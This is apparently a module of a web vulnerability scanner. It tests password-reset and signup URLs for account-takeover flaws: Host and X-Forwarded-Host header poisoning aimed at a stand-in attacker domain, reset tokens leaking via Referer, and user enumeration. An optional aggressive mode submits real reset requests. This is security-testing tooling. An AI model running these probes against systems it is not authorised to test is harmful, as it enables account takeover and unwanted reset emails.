"""Account-takeover playbook — the auth-flow bugs that pay.

Self-filters to authentication-flow URLs (forgot/reset/confirm/verify/register)
and runs the classic ATO primitives:

  1. **Password-reset poisoning** — inject `Host` / `X-Forwarded-Host` /
     `Forwarded` and see if the application reflects the attacker host (the
     reset link is then built against attacker infrastructure → the victim's
     token lands on the attacker). Read-only host-reflection probe always runs;
     the actual reset-email submission is gated behind `--aggressive`.
  2. **Reset-token leakage** — token present in the URL *and* the page loads
     third-party resources → the token leaks to those origins via `Referer`.
  3. **User enumeration** — reset endpoint distinguishes existing vs unknown
     accounts (aids targeted takeover).

Findings are conservative: blind cases are reported as needing manual
confirmation of the email link.
"""
from __future__ import annotations

import re
from typing import TYPE_CHECKING
from urllib.parse import urlparse, parse_qsl

from core.utils import host_of, random_token

if TYPE_CHECKING:
    from core.orchestrator import Context

FLOW_RE = re.compile(r"(forgot|reset|recover|password|confirm|verify|activate|"
                     r"register|signup|sign-up|magic|otp)", re.I)
RESET_FLOW_RE = re.compile(r"(forgot|reset|recover|password|magic|recover)", re.I)
TOKEN_PARAM_RE = re.compile(r"(token|reset|code|key|confirm|activation|t|otp)", re.I)
EVIL = "attacker.samaritanx.test"
THIRD_PARTY_RES_RE = re.compile(r"""<(?:script|img|link|iframe)[^>]+(?:src|href)=["']https?://([^/"']+)""", re.I)


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    if not FLOW_RE.search(url):
        return []
    findings: list[dict] = []
    aggressive = bool(ctx.config.get("safety", {}).get("aggressive"))

    findings.extend(await _host_header_poisoning(ctx, url, form, aggressive))
    findings.extend(await _token_referer_leak(ctx, url))
    findings.extend(await _user_enumeration(ctx, url, form))
    return findings


async def _host_header_poisoning(ctx, url, form, aggressive):
    findings: list[dict] = []
    poisoned = {"Host": EVIL, "X-Forwarded-Host": EVIL,
                "X-Forwarded-Server": EVIL, "Forwarded": f"host={EVIL}"}

    # read-only: does the page reflect an attacker-controlled host?
    ev = await ctx.http.get(url, headers=poisoned)
    if EVIL in (ev.response_body or "") or EVIL in ev.response_headers.get("location", ""):
        findings.append(_finding(
            url, "Host/X-Forwarded-Host", "high", 8.1,
            "Application reflected an attacker-supplied Host header into its response. "
            "On a password-reset flow the reset link is built from this host, so the "
            "victim's reset token is delivered to attacker infrastructure → account takeover.",
            detection="host_reflection"))
        return findings

    # active: submit the reset with a poisoned host (sends an email) — aggressive only
    if aggressive and RESET_FLOW_RE.search(url):
        data = _reset_payload(form)
        if data:
            ev = await ctx.http.request("POST", url, data=data, headers=poisoned)
            body = ev.response_body or ""
            if EVIL in body:
                findings.append(_finding(
                    url, "Host (reset submit)", "high", 8.3,
                    f"Reset submission reflected attacker host `{EVIL}` — poisoned reset link confirmed.",
                    detection="host_reflection_post"))
            elif ev.status in (200, 201, 202):
                findings.append(_finding(
                    url, "Host (reset submit)", "medium", 6.1,
                    "Reset request accepted with an injected Host header. Reset email could not be "
                    "observed here — manually confirm the link domain in the received email.",
                    detection="host_blind"))
    return findings


async def _token_referer_leak(ctx, url):
    q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    token_keys = [k for k in q if TOKEN_PARAM_RE.fullmatch(k)]
    if not token_keys:
        return []
    ev = await ctx.http.get(url)
    third = {h for h in THIRD_PARTY_RES_RE.findall(ev.response_body or "")
             if host_of("https://" + h) and h.split(":")[0] != urlparse(url).netloc}
    if third:
        return [_finding(
            url, ",".join(token_keys), "high", 7.4,
            f"Reset/confirm token is carried in the URL ({token_keys}) and the page loads "
            f"third-party resources ({sorted(third)[:4]}). The token leaks to those origins "
            "via the Referer header → account takeover.",
            detection="referer_leak")]
    return []


async def _user_enumeration(ctx, url, form):
    if not RESET_FLOW_RE.search(url):
        return []
    field = _email_field(form) or "email"
    real = {field: "admin@" + host_of(url).split(":")[0]}
    fake = {field: f"{random_token(10)}@{random_token(8)}.invalid"}
    ev_r = await ctx.http.request("POST", url, data=real)
    ev_f = await ctx.http.request("POST", url, data=fake)
    if ev_r.status and ev_r.status == ev_f.status:
        a, b = ev_r.response_body or "", ev_f.response_body or ""
        if a and b and abs(len(a) - len(b)) > max(120, int(0.25 * max(len(a), 1))):
            return [_finding(
                url, field, "low", 4.3,
                f"Reset endpoint returns materially different responses for a known vs unknown "
                f"account ({len(a)}B vs {len(b)}B) — user enumeration aids targeted takeover.",
                detection="user_enum")]
    return []


def _reset_payload(form):
    field = _email_field(form)
    if field:
        return {field: "victim@" + random_token(6) + ".test"}
    return {"email": "victim@" + random_token(6) + ".test"}


def _email_field(form):
    for i in (form or {}).get("inputs", []):
        name = (i.get("name") or "").lower()
        if name in ("email", "username", "user", "login", "account"):
            return i["name"]
    return None


def _finding(url, param, sev, cvss, evidence, *, detection):
    return {
        "category": "account_takeover",
        "title": f"Account takeover — {detection.replace('_', ' ')} ({urlparse(url).path})",
        "severity": sev, "cvss": cvss,
        "url": url, "parameter": param, "evidence": evidence,
        "request": f"GET/POST {url}",
        "metadata": {"detection": detection},
    }
